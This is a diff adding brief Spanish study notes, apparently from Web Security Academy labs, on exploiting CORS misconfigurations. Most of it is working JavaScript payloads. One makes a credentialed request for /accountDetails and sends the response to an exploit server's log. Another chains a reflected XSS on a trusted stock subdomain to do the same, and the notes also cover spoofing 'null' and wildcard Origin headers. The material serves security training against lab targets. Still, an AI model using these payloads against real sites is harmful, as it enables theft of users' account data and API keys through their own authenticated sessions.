@@ -1,0 +1,30 @@
+Habilitar cualquier origen o exploit server
+
+Origin: *
+Origin: http://exploit.server.com
+
+En el exploit server 
+<script>
+    var req = new XMLHttpRequest();
+    req.onload = reqListener;
+    req.open('get','https://0a58006204cdd5fb812502e700ab009c.web-security-academy.net/accountDetails',true);
+    req.withCredentials = true;
+    req.send();
+
+	function reqListener() {
+        location='/log?key='+this.responseText;
+    };
+</script>
+
+
+Anular origen
+Origin: null
+
+
+Si la página es vulnerable a xss , al poner un origin a la pagina vulnerable y ver que avanzo debemos poner 
+
+Origin: página vulnerable (escaneamos página de stock)
+
+<script>
+    document.location="http://stock.0a5800b1030e30de81d95d500009000c.web-security-academy.net/?productId=1<script>var req = new XMLHttpRequest(); req.onload = reqListener; req.open('get','https://0a5800b1030e30de81d95d500009000c.web-security-academy.net/accountDetails',true); req.withCredentials = true;req.send();function reqListener() {location='https://exploit-0a1300d903183078814d5c8d012800fb.exploit-server.net/log?key='%2bthis.responseText; };%3c/script>&storeId=1"
+</script>
